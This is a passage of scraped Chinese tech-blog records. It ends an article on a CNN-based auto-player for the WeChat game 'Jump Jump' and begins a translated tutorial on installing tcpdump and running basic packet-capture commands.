class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">reshape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">512</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd53458132587-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd53458132587-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0094 seconds] -->\r\n<p>经过十小时训练，fine模型测试集精度达到了0.5像素，实际测试精度大约为1像素，在测试机器上的inference时间0.2秒。</p>\n<h2>Cascade</h2>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnig1nfkakj20k004va9x.jpg\" width=\"690\" height=\"168\"></p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnig1gyb8ej20k00c00st.jpg\" width=\"690\" height=\"414\"></p>\n<p>总体精度1像素左右，时间0.6秒。</p>\n<h2>总结</h2>\n<p>针对这一问题，我们利用AI和CV技术，提出了合适适用于IOS和Android设备的完整解决方案，稍有技术背景的用户都可以实现成功配置、运行，我们提出了Multiscale-Search，Fast-Search，CNN Coarse-to-Fine三种解决这一问题的算法，三种算法相互配合，可以实现快速准确的搜索、跳跃，用户针对自己的设备稍加调整跳跃参数即可接近实现“永动机”。讲到这里，似乎可以宣布，我们的工作terminate了这个问题，微信小游戏跳一跳game over！</p>\n<p><b>友情提示：适度游戏益脑，沉迷游戏伤身，技术手段的乐趣在于技术本身而不在游戏排名，希望大家理性对待游戏排名和本文提出的技术，用游戏娱乐自己的生活</b></p>\n<p><b>声明：本文提出的算法及开源代码符合MIT开源协议，以商业目的使用该算法造成的一切后果须由使用者本人承担</b></p>\n<p>Git仓库地址：</p>\n<p>https://github.com/Prinsphield/Wechat_AutoJump</p>\n<p>https://github.com/Richard-An/Wechat_AutoJump</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113493\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113493votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113493\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d1a65618926b13451ddf200c0f8441e20f466de3.jpg"}
{"url_object_id": "4dc4d70b33802e7da16f0e631551759d", "title": "通过实例学习 tcpdump 命令", "url": "http://blog.jobbole.com/113452/", "create_date": "2018/01/09", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/5ebb3cabbd33c5371bc0c678d230f5fd.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 2, "tags": "IT技术,命令", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://linuxtechlab.com/learn-use-tcpdump-command-examples/\">Shusain</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9210-1.html\"> DarkSun</a>   </div><p><code>tcpdump</code> 是一个很常用的网络包分析工具，可以用来显示通过网络传输到本系统的 TCP/IP 以及其他网络的数据包。<code>tcpdump</code> 使用 libpcap 库来抓取网络报，这个库在几乎在所有的 Linux/Unix 中都有。</p>\n<div id=\"article_content\">\n<p><code>tcpdump</code> 可以从网卡或之前创建的数据包文件中读取内容，也可以将包写入文件中以供后续使用。必须是 root 用户或者使用 sudo 特权来运行 <code>tcpdump</code>。</p>\n<p>在本文中，我们将会通过一些实例来演示如何使用 <code>tcpdump</code> 命令，但首先让我们来看看在各种 Linux 操作系统中是如何安装 <code>tcpdump</code> 的。</p>\n<ul>\n<li>推荐阅读：<a href=\"http://linuxtechlab.com/monitoring-network-bandwidth-iftop-command/\">使用 iftop 命令监控网络带宽 </a></li>\n</ul>\n<h1 id=\"toc_1\">安装</h1>\n<p><code>tcpdump</code> 默认在几乎所有的 Linux 发行版中都可用，但若你的 Linux 上没有的话，使用下面方法进行安装。</p>\n<h2 id=\"toc_2\">CentOS/RHEL</h2>\n<p>使用下面命令在 CentOS 和 RHEL 上安装 <code>tcpdump</code>，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf2c260086438\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo yum install tcpdump*</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf2c260086438-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf2c260086438-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">yum </span><span class=\"crayon-e\">install </span><span class=\"crayon-e \">tcpdump*</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_3\">Fedora</h2>\n<p>使用下面命令在 Fedora 上安装 <code>tcpdump</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf35182272795\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ dnf install tcpdump</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf35182272795-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf35182272795-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">tcpdump</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h2 id=\"toc_4\">Ubuntu/Debian/Linux Mint</h2>\n<p>在 Ubuntu/Debain/Linux Mint 上使用下面命令安装 <code>tcpdump</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf39029897272\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ apt-get install tcpdump</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf39029897272-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf39029897272-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">tcpdump</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>安装好 <code>tcpdump</code> 后，现在来看一些例子。</p>\n<h1 id=\"toc_5\">案例演示</h1>\n<h2 id=\"toc_6\">从所有网卡中捕获数据包</h2>\n<p>运行下面命令来从所有网卡中捕获数据包：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf3d591910392\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i any</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf3d591910392-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf3d591910392-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">any</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_7\">从指定网卡中捕获数据包</h2>\n<p>要从指定网卡中捕获数据包，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf40878521028\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i eth0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf40878521028-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf40878521028-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_8\">将捕获的包写入文件</h2>\n<p>使用 <code>-w</code> 选项将所有捕获的包写入文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf43536722986\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i eth1 -w packets_file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf43536722986-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf43536722986-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">packets_file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2 id=\"toc_9\">读取之前产生的 tcpdump 文件</h2>\n<p>使用下面命令从之前创建的 tcpdump 文件中读取内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf47376056104\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 